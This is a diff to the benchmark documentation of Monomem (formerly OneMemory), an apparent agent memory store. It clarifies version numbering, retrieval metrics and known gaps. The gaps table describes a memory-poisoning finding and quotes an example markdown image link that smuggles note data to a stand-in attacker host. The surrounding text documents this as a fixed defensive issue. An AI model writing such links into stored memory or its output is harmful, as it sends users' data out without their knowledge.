@@ -11,6 +11,10 @@ monomem bench --json          # every scenario, every check, expected vs actual
 npm run bench                   # same, from a checkout (builds first)
 ```
 
+Version numbers: Monomem was called OneMemory until early November 2026, and its version numbers started again at 1.0.0
+after the rename. "OneMemory 1.5.0", "OneMemory 1.6.0" and "OneMemory 2.0.0" below are older releases under the old name,
+not Monomem versions (CHANGELOG.md has both lines).
+
 It never touches your own data: it creates a temporary folder, starts a private server on `127.0.0.1` with
 random tokens, hides every `MONOMEM_*` setting while it runs, writes its audit log into the temporary
 folder, and deletes everything when it ends.
@@ -248,7 +252,7 @@ monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [-
 - **Questions.** LongMemEval's 30 abstention questions (`_abs`) have no gold session and are left out: 470 of
   500 are scored. LoCoMo questions with no usable evidence id are left out: 1,982 of 1,986.
 - **Three searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `state_search` and
-  `GET /search`: FTS5/BM25 with every word first, then (since 2.0.0) notes matching some of the words, always ranked
+  `GET /search`: FTS5/BM25 with every word first, then (since OneMemory 2.0.0, before the rename) notes matching some of the words, always ranked
   below full matches. `relevant` is `runRelevantSearch` (the `state_relevant` tool and `POST /relevant`): stop words
   dropped, any keyword qualifies, one BM25 OR query scaled by the share of keywords each note contains (before 2026-11-04:
   per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores
@@ -268,7 +272,11 @@ higher than the 2026-11-09 ones (same ranking code) and should be read as "loade
 
 **Strict recall-all@5 (`Rall@5`), new in this round.** `R@5` counts a question as found when any one gold session is in the
 top 5; `Rall@5` needs every gold session there. Questions with one gold session score the same on both, so the gap is all in
-multi-session questions.
+multi-session questions. Ceiling: 3 of the 470 LongMemEval-S questions have more than 5 gold sessions, so they can never
+pass `Rall@5`: the highest possible LongMemEval-S `Rall@5` is 99.4, not 100.
+
+**End-to-end task success: not measured.** Every number in this section is retrieval (is the right session in the top k). None
+measures whether an agent then answers the question or finishes its task better with Monomem than without it.
 
 | Run | search | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
 |---|---|---|---|---|---|---|---|---|
@@ -512,7 +520,7 @@ The older tables below are kept as they were measured.
 
 ### Results, 2026-10-31
 
-Machine: Windows 11 Home, RTX 5080 PC, Node v24.18.0, Monomem 2.0.0. Embeddings for `hybrid`: `nomic-embed-text`
+Machine: Windows 11 Home, RTX 5080 PC, Node v24.18.0, OneMemory 2.0.0 (the same code line before the rename to Monomem; there is no Monomem 2.0.0). Embeddings for `hybrid`: `nomic-embed-text`
 through a local Ollama (`MONOMEM_EMBEDDINGS=on`, `MONOMEM_EMBED_URL=http://127.0.0.1:11499/v1/embeddings`).
 Commands exactly as above. Wall time with embeddings: LongMemEval session 15 min (embedding every session is the cost),
 LoCoMo a few minutes; keyword-only runs take seconds.
@@ -648,7 +656,7 @@ Per question type, LongMemEval-S, `relevant`, now:
 | relevant (`state_relevant`) | 95.3 | 97.4 | 88.5 | 87.1 | 88.0 | 1.4 / 3.0 ms |
 | hybrid (BM25 + embeddings) | **96.8** | **98.5** | **93.0** | **90.4** | **91.4** | 21 / 30 ms |
 
-Before the 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.
+Before the OneMemory 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.
 
 Per question type, `relevant`:
 
@@ -678,7 +686,7 @@ nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.
 
 ### How to read these numbers
 
-- **Natural-language questions to `state_search` used to fail.** Before 2.0.0 it needed every word ("what", "did",
+- **Natural-language questions to `state_search` used to fail.** Before OneMemory 2.0.0 it needed every word ("what", "did",
   "I", ...) in one note and found the right session 12 % of the time on LongMemEval-S. The any-word fallback fixed it
   (95 %); full matches still rank first, so short exact queries behave as before.
 - **Hybrid (2026-10-31 rows) was not always better.** On LoCoMo whole sessions the old RRF hybrid ranked worse than
@@ -720,7 +728,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -729,7 +737,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
-| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
 | `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
